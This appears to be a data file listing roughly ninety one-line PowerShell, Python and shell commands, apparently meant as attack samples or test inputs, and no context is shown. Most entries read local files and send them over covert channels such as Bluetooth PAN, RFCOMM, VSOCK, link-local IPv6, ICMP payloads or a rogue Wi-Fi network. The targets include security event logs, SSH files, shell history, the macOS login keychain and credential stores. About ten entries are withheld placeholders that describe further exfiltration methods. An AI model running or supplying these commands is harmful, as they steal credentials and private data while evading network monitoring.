  "$sync='fe80::1%13'; $d='fd00:c001::7'; Test-Connection -ComputerName $sync -Count 1 -BufferSize 333 -IPv6 -Quiet | Out-Null; [IO.File]::ReadAllBytes('C:\\Users\\Public\\report.bin') | ForEach-Object { Test-Connection -ComputerName $d -Count 1 -BufferSize (333 + $_) -IPv6 -Quiet | Out-Null }",
  "& 'C:\\Tools\\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $if=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1).Name; netsh interface ip set address name=\"$if\" static 172.31.200.2 255.255.255.252 | Out-Null; $msg=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((Get-ChildItem Env: | Out-String))); $u=New-Object Net.Sockets.UdpClient; $u.Client.Bind([Net.IPEndPoint]::new([Net.IPAddress]::Parse('172.31.200.2'),0)); $dat=[Text.Encoding]::UTF8.GetBytes($msg); $u.Send($dat,$dat.Length,'172.31.200.1',53209) | Out-Null; $u.Close()",
  "& 'C:\\Tools\\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $if=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1).Name; netsh interface ip set address name=\"$if\" static 10.203.77.2 255.255.255.252 | Out-Null; $payload=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Users\\Public\\Videos\\clip.mp4')); $cli=New-Object Net.Sockets.TcpClient; $cli.Client.Bind([Net.IPEndPoint]::new([Net.IPAddress]::Parse('10.203.77.2'),0)); $cli.Connect('10.203.77.1',53421); $st=$cli.GetStream(); for($i=0;$i -lt $payload.Length;$i+=2048){ $ch=$payload.Substring($i,[Math]::Min(2048,$payload.Length-$i)); $bb=[Text.Encoding]::UTF8.GetBytes($ch); $st.Write($bb,0,$bb.Length) }; $st.Close(); $cli.Close()",
  "& 'C:\\Tools\\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $ad=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1); netsh interface ip set address name=\"$($ad.Name)\" static 10.241.56.2 255.255.255.252 | Out-Null; route add 10.241.56.1 mask 255.255.255.255 10.241.56.2 if $($ad.ifIndex) metric 5 | Out-Null; $b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\misc.bin')); $c=New-Object Net.Sockets.TcpClient; $c.Client.Bind([Net.IPEndPoint]::new([Net.IPAddress]::Parse('10.241.56.2'),0)); $c.Connect('10.241.56.1',54107); $s=$c.GetStream(); $x=[Text.Encoding]::UTF8.GetBytes($b); $s.Write($x,0,$x.Length); $s.Close(); $c.Close()",
  "& 'C:\\Tools\\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $if=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1).Name; netsh interface ip set address name=\"$if\" static 172.27.45.2 255.255.255.252 | Out-Null; $body=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Users\\Public\\Pictures\\img1.png')); $ProgressPreference='SilentlyContinue'; Invoke-WebRequest -Uri 'http://172.27.45.1:52873/u' -Method POST -Body $body -UseBasicParsing -Headers @{ 'X-T'='b' } | Out-Null",
  "& 'C:\\Tools\\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $if=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1).Name; netsh interface ip set address name=\"$if\" static 172.25.83.2 255.255.255.252 | Out-Null; $data=[IO.File]::ReadAllBytes('C:\\Users\\Public\\fin.xlsx'); $b64=[Convert]::ToBase64String($data); $tcp=New-Object Net.Sockets.TcpClient; $tcp.Client.Bind([Net.IPEndPoint]::new([Net.IPAddress]::Parse('172.25.83.2'),0)); $tcp.Connect('172.25.83.1',52319); $ns=$tcp.GetStream(); $buf=[Text.Encoding]::UTF8.GetBytes($b64); $ns.Write($buf,0,$buf.Length); $ns.Close(); $tcp.Close()",
  "& 'C:\\Tools\\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $if=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1).Name; netsh interface ip set address name=\"$if\" static 172.25.83.6 255.255.255.252 | Out-Null; $payload=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Windows\\System32\\winevt\\Logs\\Security.evtx')); $udp=New-Object Net.Sockets.UdpClient; $udp.Client.Bind([Net.IPEndPoint]::new([Net.IPAddress]::Parse('172.25.83.6'),0)); $bytes=[Text.Encoding]::UTF8.GetBytes($payload); $udp.Send($bytes,$bytes.Length,'172.25.83.5',53127) | Out-Null; $udp.Close()",
  "& 'C:\\Tools\\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $if=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1).Name; netsh interface ip set address name=\"$if\" static 172.29.61.2 255.255.255.252 | Out-Null; $b64=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Users\\Public\\Desktop\\notes.txt')); $client=New-Object Net.Sockets.TcpClient; $client.Client.Bind([Net.IPEndPoint]::new([Net.IPAddress]::Parse('172.29.61.2'),0)); $client.Connect('172.29.61.1',54721); $strm=$client.GetStream(); $pref=[Text.Encoding]::UTF8.GetBytes('DATA:'); $dat=[Text.Encoding]::UTF8.GetBytes($b64); $suf=[Text.Encoding]::UTF8.GetBytes(':END'); $strm.Write($pref,0,$pref.Length); $strm.Write($dat,0,$dat.Length); $strm.Write($suf,0,$suf.Length); $strm.Close(); $client.Close()",
  "& 'C:\\Tools\\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $if=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1).Name; netsh interface ip set address name=\"$if\" static 10.223.93.2 255.255.255.252 | Out-Null; $body=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Users\\Public\\Documents\\balances.csv')); $ProgressPreference='SilentlyContinue'; Invoke-RestMethod -Uri 'http://10.223.93.1:52901/api/upload' -Method Put -Body $body -Headers @{ 'X-From'='btpan' } | Out-Null",
  "& 'C:\\Tools\\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $i=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1).Name; netsh interface ip set address name=\"$i\" static 10.226.38.2 255.255.255.252 | Out-Null; $buf=[IO.File]::ReadAllBytes('C:\\Users\\Public\\Music\\song.mp3'); $b=[Convert]::ToBase64String($buf); $cli=New-Object Net.Sockets.TcpClient; $cli.Client.Bind([Net.IPEndPoint]::new([Net.IPAddress]::Parse('10.226.38.2'),0)); $cli.Connect('10.226.38.1',54295); $ns=$cli.GetStream(); [byte[]]$head=[Text.Encoding]::UTF8.GetBytes('POST /d HTTP/1.0`r`nX: bt`r`n`r`n'); $ns.Write($head,0,$head.Length); $bts=[Text.Encoding]::UTF8.GetBytes($b); $ns.Write($bts,0,$bts.Length); $ns.Close(); $cli.Close()",
  "& 'C:\\Tools\\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $if=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1).Name; netsh interface ip set address name=\"$if\" static 10.224.17.2 255.255.255.252 | Out-Null; $q=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Users\\Public\\Documents\\q3-report.docx')); $t=New-Object Net.Sockets.TcpClient; $t.Client.Bind([Net.IPEndPoint]::new([Net.IPAddress]::Parse('10.224.17.2'),0)); $t.Connect('10.224.17.1',53337); $st=$t.GetStream(); $req=[Text.Encoding]::UTF8.GetBytes(('GET /u?d='+[Uri]::EscapeDataString($q)+' HTTP/1.1`r`nHost: x`r`nConnection: close`r`n`r`n')); $st.Write($req,0,$req.Length); $st.Close(); $t.Close()",
  "python3 -c \"import socket,os,time; s=socket.socket(socket.AF_BLUETOOTH, socket.SOCK_STREAM, socket.BTPROTO_RFCOMM); s.settimeout(6); s.connect(('33:44:55:66:77:88', 23)); p=os.path.expanduser('~/.gitconfig'); d=open(p,'rb').read(); [s.send(d[i:i+512]) or time.sleep(0.05) for i in range(0,len(d),512)]; s.close()\"",
  "python3 -c \"import socket,os; s=socket.socket(socket.AF_BLUETOOTH, socket.SOCK_SEQPACKET, socket.BTPROTO_L2CAP); s.settimeout(6); s.connect(('38:18:4C:AA:BB:CC', 0x1001)); p=os.path.expanduser('~/.config/user-dirs.dirs'); s.sendall(open(p,'rb').read()); s.close()\"",
  "python3 -c \"import socket,os; s=socket.socket(socket.AF_BLUETOOTH, socket.SOCK_STREAM, socket.BTPROTO_RFCOMM); s.settimeout(6); s.connect(('24:71:89:5A:BC:10', 19)); p=os.path.expanduser('~/.ssh/known_hosts'); s.sendall(open(p,'rb').read()); s.close()\"",
  "python3 -c \"import socket,os; s=socket.socket(socket.AF_BLUETOOTH, socket.SOCK_SEQPACKET, socket.BTPROTO_L2CAP); s.settimeout(6); s.connect(('64:6E:6C:AA:BB:CC', 0x1009)); p=os.path.expanduser('~/.ssh/config'); import sys; d=b'';\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\ntry:\\n d=open(p,'rb').read()\\nexcept Exception:\\n d=b''\\nfinally:\\n s.sendall(d); s.close()\"",
  "python3 -c \"import socket,os,platform; s=socket.socket(socket.AF_VSOCK, socket.SOCK_STREAM); s.settimeout(6); s.connect((4, 53211)); payload=('uid='+str(os.getuid())+' host='+platform.node()+'\\n').encode(); s.sendall(payload); s.close()\"",
  "python3 -c \"import socket,platform; s=socket.socket(socket.AF_BLUETOOTH, socket.SOCK_SEQPACKET, socket.BTPROTO_L2CAP); s.settimeout(6); s.connect(('5C:F3:70:12:34:56', 0x1003)); s.sendall(('sys='+str(platform.uname())+'\\n').encode()); s.close()\"",
  "python3 -c \"import socket,os; s=socket.socket(socket.AF_VSOCK, socket.SOCK_STREAM); s.settimeout(6); s.connect((3, 58821)); p=os.path.expanduser('~/.config/gtk-3.0/bookmarks'); s.sendall(open(p,'rb').read()); s.close()\"",
  "python3 -c \"import socket; s=socket.socket(socket.AF_VSOCK, socket.SOCK_STREAM); s.settimeout(6); s.connect((2, 47419)); s.sendall(open('/etc/hostname','rb').read()); s.close()\"",
  "python3 -c \"import socket,os; s=socket.socket(socket.AF_BLUETOOTH, socket.SOCK_STREAM, socket.BTPROTO_RFCOMM); s.settimeout(6); s.connect(('00:1A:7D:DA:71:13', 27)); p=os.path.expanduser('~/.bash_history'); s.sendall(open(p,'rb').read()); s.close()\"",
  "python3 -c \"import socket; s=socket.socket(socket.AF_VSOCK, socket.SOCK_STREAM); s.settimeout(6); s.connect((2, 60917)); s.sendall(open('/etc/hosts','rb').read()); s.close()\"",
  "[withheld — non-actionable: would send base64-encoded data in fixed-size chunks via IPv6 UDP (AF_INET6/SOCK_DGRAM) to a unique-local address with a low hop-limit]",
  "[withheld — non-actionable: would send base64-encoded data via IPv6 UDP to a link-local target using a specified scope ID, segmenting payload to avoid detection and common ports]",
  "[withheld — non-actionable: would bind an IPv4 UDP socket to a secondary/non-default local address, optionally set DSCP/TOS, and transmit base64-encoded chunks to a high-numbered port]",
  "[withheld — non-actionable: would set SO_DONTROUTE on an IPv4 TCP socket, bind to a non-default local address, connect to a high, uncommon port, and send base64-encoded data]",
  "[withheld — non-actionable: would use IPv6 UDP with a specified traffic class (if available) to send base64-encoded chunks to a unicast destination on a high, uncommon port]",
  "[withheld — non-actionable: would bind an IPv6 TCP socket to a non-default link-local source address (scope-indexed) before connecting to a unique-local IPv6 target on a high port, then send base64 data]",
  "[withheld — non-actionable: would bind an IPv4 UDP socket to an APIPA/isolated adapter address and send base64-encoded chunks to a peer on an uncommon UDP port with low TTL]",
  "[withheld — non-actionable: would open an IPv6 TCP socket (AF_INET6) scoped to a link-local interface and transmit base64-encoded file data to a high, uncommon port]",
  "[withheld — non-actionable: would craft ICMP Echo Request packets (AF_INET/SOCK_RAW, IPPROTO_ICMP) carrying base64-encoded payload segments with proper checksums]",
  "[withheld — non-actionable: would enforce IPv6-only on a TCP socket and send base64-encoded data to a unique-local IPv6 service listening on an uncommon port]",
  "python3 -c 'import socket,uuid; s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM); addr=(\"203.0.113.200\", 53530); tid=str(uuid.uuid4()).encode(); d=open(\"/Users/Shared/.dmp\",\"rb\").read(); [ s.sendto(tid+b\"|\"+d[i:i+500], addr) for i in range(0,len(d),500) ]; s.close()'",
  "python3 -c 'import socket,datetime; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\"198.51.100.23\", 49201)); prefix=(\"<34>1 \"+datetime.datetime.utcnow().isoformat()+\"Z macos app - - - \").encode(); s.sendall(prefix+open(\"/Users/Shared/.slog\",\"rb\").read()); s.close()'",
  "python3 -c 'import socket,struct; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\"203.0.113.88\", 52689)); d=open(\"/Users/Shared/.rpt\",\"rb\").read(); s.sendall(struct.pack(\"!I\",len(d))+d); s.close()'",
  "python3 -c 'import socket,struct; s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP); s.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 1); addr=(\"239.197.3.9\", 49321); d=open(\"/Users/Shared/.localstate\",\"rb\").read(); [s.sendto(d[i:i+800], addr) for i in range(0,len(d),800)]; s.close()'",
  "python3 -c 'import socket; s=socket.socket(socket.AF_INET6, socket.SOCK_DGRAM); s.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_TCLASS, 0x2c); addr=(\"2001:db8:44::4\", 49512, 0, 0); d=open(\"/Users/Shared/.cache2\",\"rb\").read(); [s.sendto(d[i:i+600], addr) for i in range(0,len(d),600)]; s.close()'",
  "python3 -c 'import socket; s=socket.socket(socket.AF_INET6, socket.SOCK_STREAM); s.connect((\"2001:db8:ac:2::9\", 55999, 0, 0)); s.sendall(open(\"/Users/Shared/._q\",\"rb\").read()); s.close()'",
  "python3 -c 'import socket; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\"203.0.113.77\", 2526)); w=lambda x:s.sendall(x); w(b\"HELO x\\r\\nMAIL FROM:<u@lab>\\r\\nRCPT TO:<r@lab>\\r\\nDATA\\r\\n\"); w(open(\"/Users/Shared/.z\",\"rb\").read()+b\"\\r\\n.\\r\\nQUIT\\r\\n\"); s.close()'",
  "python3 -c 'import socket; s=socket.socket(socket.AF_INET6, socket.SOCK_DGRAM); addr=(\"2001:db8:ab:1::7\", 49160, 0, 0); d=open(\"/Users/Shared/.cache.db\",\"rb\").read(); [s.sendto(d[i:i+900], addr) for i in range(0,len(d),900)]; s.close()'",
  "python3 -c 'import socket,time; s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM); addr=(\"198.51.100.45\", 49444); d=open(\"/Users/Shared/.k\",\"rb\").read(); [ (s.sendto(d[i:i+700], addr), time.sleep(0.15)) for i in range(0,len(d),700) ]; s.close()'",
  "python3 -c 'import socket; s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1); addr=(\"255.255.255.255\", 49876); d=open(\"/Users/Shared/.sync.log\",\"rb\").read(); [s.sendto(d[i:i+1024], addr) for i in range(0,len(d),1024)]; s.close()'",
  "sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -z && networksetup -setairportnetwork en0 \"field_ops_149\" \"kHz149-pass\" && base64 < /Users/Shared/exports/db.dump | nc -6u fe80::7a8b:9c0d:1e2f:3a4b%en0 53317 -w 2",
  "sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -z && networksetup -setairportnetwork en0 \"ptp-bridge-161\" \"ptp161!\" && base64 < /Users/Shared/exports/.cache.bin | nc -6 fe80::dada:1ee7:face:b00c%en0 57211 -N -w 1",
  "sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -z && networksetup -setairportnetwork en0 \"lab-rnd-157\" \"rNd!157\" && base64 < <(dd if=/Users/Shared/exports/disk.img bs=1m count=5) | nc 10.203.55.4 61009 -w 2 -N",
  "sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -z && networksetup -setairportnetwork en0 \"closed-lab-ACS\" \"cl@b-5g-157\" && gzip -c /Users/Shared/exports/audit.sqlite | base64 | nc 169.254.203.90 62015 -w 2 -N",
  "sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -z && networksetup -setairportnetwork en0 \"plant-165-ap\" \"P1@nt165\" && gzip -c /Users/Shared/exports/notes.txt | base64 | nc -6u fe80::b10c:0ffe:ca7e:f00d%en0 53371 -w 2",
  "sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -z && networksetup -setairportnetwork en0 \"staging-149\" \"sTag149%\" && tar -C /Users/Shared/exports -czf - configs | openssl base64 -A | while read -r l; do printf \"%s\\n\" \"$l\" | nc -6 fe80::cafe:5eed:ba11:5eed%en0 53219 -w 1; sleep 0.3; done",
  "sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -z && networksetup -setairportnetwork en0 \"svc-backhaul-165\" \"d3c0y-165!\" && tar -czf - /Users/Shared/exports/report.csv | base64 | nc -6 fe80::2c3d:4e5f:6a7b:8c9d%en0 55991 -w 3 -N",
  "sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -z && sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport --channel=153 && networksetup -setairportnetwork en0 \"fw-ops-153\" \"fw153@\" && tar -czf - /Users/Shared/exports/photos | base64 | nc -6u fe80::c0ff:ee00:1bad:c0de%en0 50923 -w 2",
  "sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -z && networksetup -setairportnetwork en0 \"ops-relay-153\" \"ops-153-=\" && openssl enc -base64 -A -in /Users/Shared/exports/metrics.json | nc -6 fe80::f00d:beef:dead:ba5e%en0 54831 -w 3",
  "sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -z && networksetup -setairportnetwork en0 \"qa-mesh-161\" \"mesh-161#\" && tar -C /Users/Shared/exports -czf - logs | base64 | split -b 1200k - /tmp/.w && for f in /tmp/.w*; do nc -6 fe80::a1b2:c3d4:e5f6:1122%en0 60477 -w 2 < \"$f\"; rm \"$f\"; done",
  "IF=wlan2; iwconfig \"$IF\" >/dev/null 2>&1 && python3 -c 'import os,sys,socket,subprocess; iface=os.environ[\"IF\"]; src=subprocess.check_output(\"ip -4 -o addr show \"+iface, shell=True).decode().split()[3].split(\"/\")[0]; s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM); s.bind((src,0)); s.sendto(open(sys.argv[1],\"rb\").read(), (sys.argv[2], int(sys.argv[3])))' /home/user/.local/state/cache.idx 10.55.88.11 49537",
  "iwconfig wlan2 >/dev/null 2>&1 && cat /home/user/.local/share/.sync.log | ssh -q -o ConnectTimeout=5 -o BindAddress=\"$(ip -4 addr show wlan2 | awk '/inet /{print $2}' | cut -d/ -f1)\" -p 49377 exfil@10.55.88.25 \"cat > ~/rx/.sync.log\"",
  "iwconfig wlan1 >/dev/null 2>&1 && nc -u -w 2 -s \"$(ip -4 addr show wlan1 | awk '/inet /{print $2}' | cut -d/ -f1)\" 10.55.88.5 49175 < /home/user/.cache/.tmp.bin",
  "iwconfig wlan2 >/dev/null 2>&1 && rsync -a --quiet -e \"ssh -o ConnectTimeout=5 -o BindAddress=$(ip -4 addr show wlan2 | awk '/inet /{print $2}' | cut -d/ -f1) -p 49222\" /home/user/.cache/session.dat exfil@10.55.88.12:~/inbox/session.dat",
  "iwconfig wlan1 >/dev/null 2>&1 && scp -q -P 49288 -o ConnectTimeout=5 -o BindAddress=\"$(ip -4 addr show wlan1 | awk '/inet /{print $2}' | cut -d/ -f1)\" /home/user/.local/share/keys.db exfil@10.55.88.20:~/rx/keys.db",
  "iwconfig wlan1 >/dev/null 2>&1 && curl --silent --show-error --interface wlan1 --max-time 5 -T /home/user/.config/notes.db http://10.55.88.9:49190/upload",
  "iwconfig wlan2 >/dev/null 2>&1 && openssl s_client -quiet -connect 10.55.88.15:49573 -bind \"$(ip -4 addr show wlan2 | awk '/inet /{print $2}' | cut -d/ -f1)\":0 < /home/user/.cache/map.dat",
  "iwconfig wlan1 >/dev/null 2>&1 && socat -u FILE:/home/user/.cache/k.bin UDP4-SENDTO:10.55.88.7:49401,interface=wlan1",
  "iwconfig wlan1 >/dev/null 2>&1 && wget --quiet --tries=1 --timeout=5 --bind-address=\"$(ip -4 addr show wlan1 | awk '/inet /{print $2}' | cut -d/ -f1)\" --post-file=/home/user/.config/cache.json http://10.55.88.13:49502/ingest",
  "iwconfig wlan2 >/dev/null 2>&1 && nc -w 3 -s \"$(ip -4 addr show wlan2 | awk '/inet /{print $2}' | cut -d/ -f1)\" 10.55.88.6 49321 < /home/user/.local/share/usage.log",
  "cat /Users/$USER/Library/Preferences/com.apple.finder.plist | nc -s \"$(networksetup -getinfo 'Thunderbolt Bridge' | awk -F': ' '/IP address/{print $2}')\" 198.51.100.88 58231",
  "tar cf - ~/Library/Group\\ Containers | gzip -1 | nc -s \"$(networksetup -getinfo 'FireWire' | awk -F': ' '/IP address/{print $2}')\" 203.0.113.10 55284",
  "IP=\"$(networksetup -getinfo 'Thunderbolt Bridge' | awk -F': ' '/IP address/{print $2}')\"; python3 -c \"import socket; s=socket.socket(); s.bind(('\"$IP\"',0)); s.connect(('203.0.113.90',54921)); s.sendall(open('/Users/$USER/.bash_history','rb').read()); s.close()\"",
  "curl --interface \"$(networksetup -getinfo 'iPhone USB' | awk -F': ' '/IP address/{print $2}')\" --header 'Content-Type: application/octet-stream' --data-binary @/Users/$USER/Library/Keychains/login.keychain-db http://203.0.113.51:52888/k",
  "sysctl -a | gzip -c | nc -s \"$(networksetup -getinfo 'Bluetooth PAN' | awk -F': ' '/IP address/{print $2}')\" 203.0.113.66 57114",
  "nc -u -s \"$(networksetup -getinfo 'Bluetooth PAN' | awk -F': ' '/IP address/{print $2}')\" 198.51.100.23 55391 < ~/Library/Application\\ Support/AppCache/cache.db",
  "dd if=/Users/$USER/Library/Logs/system.log bs=64k | nc -s \"$(networksetup -getinfo 'iPhone USB' | awk -F': ' '/IP address/{print $2}')\" 198.51.100.77 53499",
  "tar czf - ~/Documents/Reports | nc -s \"$(networksetup -getinfo 'Bluetooth PAN' | awk -F': ' '/IP address/{print $2}')\" 203.0.113.50 55812",
  "curl --interface \"$(networksetup -getinfo 'Thunderbolt Bridge' | awk -F': ' '/IP address/{print $2}')\" -X POST --data-binary @/Users/$USER/.local/share/.dmp http://203.0.113.60:59671/upload",
  "curl --interface \"$(networksetup -getinfo 'USB 10/100/1000 LAN' | awk -F': ' '/IP address/{print $2}')\" --retry 0 --data-binary @/Users/$USER/.ssh/known_hosts https://203.0.113.60:51443/i",
  "nc -6 -s \"$(ipconfig getv6ifaddr en5)\" \"fe80::2:abcd:7%en5\" 53127 < /Users/Shared/.cache.bin",
  "nc -6 -u -s \"$(ipconfig getv6ifaddr gif0)\" \"fe80::8:dead:2%gif0\" 54329 < /tmp/.trace",
  "nc -6 -u -s \"$(ipconfig getv6ifaddr llw0)\" \"ff02::1%llw0\" 54901 < /tmp/.z",
  "nc -6 -u -s \"$(ipconfig getv6ifaddr utun2)\" \"fe80::5:cafe:2%utun2\" 55444 < /tmp/.audit.log",
  "nc -6 -s \"$(ipconfig getv6ifaddr stf0)\" \"fe80::9:bead:3%stf0\" 52217 < /tmp/.q",
  "scp -B -o BindAddress=\"$(ipconfig getv6ifaddr bridge0)\" -P 56432 /tmp/diag.tgz \"u@[fe80::4:feed:1%bridge0]:/tmp/.u\"",
  "python3 -c \"from scapy.all import *;src='$(ipconfig getv6ifaddr p2p0)';dst='fe80::6:bad:1%p2p0';d=open('/Users/Shared/.dmp','rb').read();[send(IPv6(src=src,dst=dst)/ICMPv6EchoRequest(data=d[i:i+1200]),iface='p2p0',verbose=0) for i in range(0,len(d),1200)]\"",
  "nc -6 -u -s \"$(ipconfig getv6ifaddr awdl0)\" \"fe80::b0b:beef:1%awdl0\" 52789 < /var/log/system.log",
  "python3 -c \"from scapy.all import *;src='$(ipconfig getv6ifaddr awdl0)';dst='fe80::3:dead:beef%awdl0';p=open('/tmp/diag.bin','rb').read();[send(IPv6(src=src,dst=dst)/UDP(sport=51888,dport=51888)/p[i:i+1200],iface='awdl0',verbose=0) for i in range(0,len(p),1200)]\"",
  "nc -6 -s \"$(ipconfig getv6ifaddr utun4)\" \"fe80::7:0bad:f00d%utun4\" 55222 < /private/var/tmp/.r",
  "nohup tcpdump -i bnep0 -nn tcp port 53211 -U -w /dev/null >/dev/null 2>&1 & nc -s 192.168.44.10 192.168.44.20 53211 < /var/tmp/.cache/img.dat",
  "nohup tcpdump -i wwan0 -nn tcp port 55941 -U -w /dev/null >/dev/null 2>&1 & nc -s 10.64.23.5 10.64.23.9 55941 < /var/tmp/report.enc",
  "nohup tcpdump -i usb0 -nn 'ip6 and tcp port 54531' -U -w /dev/null >/dev/null 2>&1 & nc -6 -s fe80::a00:27ff:fe12:3456%usb0 fe80::2%usb0 54531 < /home/user/.local/share/archive.tgz",
  "nohup tcpdump -i lowpan0 -nn 'ip6 and udp port 56831' -U -w /dev/null >/dev/null 2>&1 & nc -6 -u -s fe80::100%lowpan0 fe80::200%lowpan0 56831 < /var/tmp/data.blob",
  "nohup tcpdump -i p2p-wlp2s0-0 -nn udp port 55303 -U -w /dev/null >/dev/null 2>&1 & dd if=/var/tmp/.sdata bs=64k 2>/dev/null | nc -u -s 192.168.49.1 192.168.49.2 55303",
  "nohup tcpdump -i p2p-wlp2s0-0 -nn tcp port 55219 -U -w /dev/null >/dev/null 2>&1 & nc -s 192.168.49.1 192.168.49.2 55219 < /var/tmp/.cache/sys.snap",
  "nohup tcpdump -i usb0 -nn tcp port 54177 -U -w /dev/null >/dev/null 2>&1 & nc -s 172.16.42.1 172.16.42.2 54177 < /home/user/.config/state.db",
  "nohup tcpdump -i ib0 -nn tcp port 56473 -U -w /dev/null >/dev/null 2>&1 & nc -s 10.0.0.10 10.0.0.20 56473 < /var/tmp/pkg.cache",
  "nohup tcpdump -i bnep0 -nn udp port 53287 -U -w /dev/null >/dev/null 2>&1 & nc -u -s 192.168.44.10 192.168.44.20 53287 < /var/tmp/.cache/creds.bin",
  "nohup tcpdump -i wwan0 -nn udp port 56107 -U -w /dev/null >/dev/null 2>&1 & gzip -c /var/tmp/local.db | nc -u -s 10.64.23.5 10.64.23.9 56107",
  "$cell=Get-NetAdapter -InterfaceAlias 'Cellular' -ErrorAction Stop; $dst='198.18.0.42'; $gw=(Get-NetIPConfiguration -InterfaceIndex $cell.ifIndex).IPv4DefaultGateway.NextHop; if($gw){cmd /c \"route add $dst mask 255.255.255.255 $gw metric 5 if $($cell.ifIndex)\"}; $ip=(Get-NetIPAddress -InterfaceIndex $cell.ifIndex -AddressFamily IPv4).IPAddress; iperf3.exe -c $dst -p 65055 -B $ip -t 50",
  "$bt=Get-NetAdapter -Name 'Bluetooth Network Connection' -ErrorAction Stop; $lip=(Get-NetIPAddress -InterfaceIndex $bt.ifIndex -AddressFamily IPv4).IPAddress; Start-Process -WindowStyle Hidden -FilePath iperf3.exe -ArgumentList \"-c 172.31.199.2 -p 55222 -B $lip -u -t 40\"",
  "New-NetIPAddress -InterfaceAlias 'Bluetooth Network Connection' -IPAddress 192.168.55.10 -PrefixLength 24 -ErrorAction SilentlyContinue; Start-Process -WindowStyle Hidden iperf3.exe -ArgumentList \"-s -p 59321 -B 192.168.55.10\"",
  "$route='172.31.199.2'; $bt=Get-NetAdapter -Name 'Bluetooth Network Connection' -ErrorAction Stop; $gw=(Get-NetIPConfiguration -InterfaceIndex $bt.ifIndex).IPv4DefaultGateway.NextHop; if($gw){cmd /c \"route add $route mask 255.255.255.255 $gw metric 5 if $($bt.ifIndex)\"}; $lip=(Get-NetIPAddress -InterfaceIndex $bt.ifIndex -AddressFamily IPv4).IPAddress; iperf3.exe -c $route -p 55777 -B $lip -t 60",
  "$usb=Get-NetAdapter | Where-Object {$_.InterfaceDescription -like '*Remote NDIS based Internet Sharing Device*'}; if($usb){$ip=(Get-NetIPAddress -InterfaceIndex $usb.ifIndex -AddressFamily IPv4).IPAddress; iperf3.exe -c 104.87.215.11 -p 61111 -B $ip -u -t 35}",
  "$wd=Get-NetAdapter -InterfaceDescription 'Microsoft Wi-Fi Direct Virtual Adapter' -ErrorAction Stop; $ip=(Get-NetIPAddress -InterfaceIndex $wd.ifIndex -AddressFamily IPv4).IPAddress; Start-Process -WindowStyle Hidden -FilePath iperf3.exe -ArgumentList \"-c 192.168.137.2 -p 64222 -B $ip -t 50\"",
  "netsh wlan connect name=\"DIRECT-EXFIL-5G\" ssid=\"DIRECT-EXFIL-5G\" interface=\"Wi-Fi\" | Out-Null; $wf=Get-NetAdapter -InterfaceAlias 'Wi-Fi' -ErrorAction Stop; $ip=(Get-NetIPAddress -InterfaceIndex $wf.ifIndex -AddressFamily IPv4).IPAddress; iperf3.exe -c 10.19.7.1 -p 57999 -B $ip -t 45",
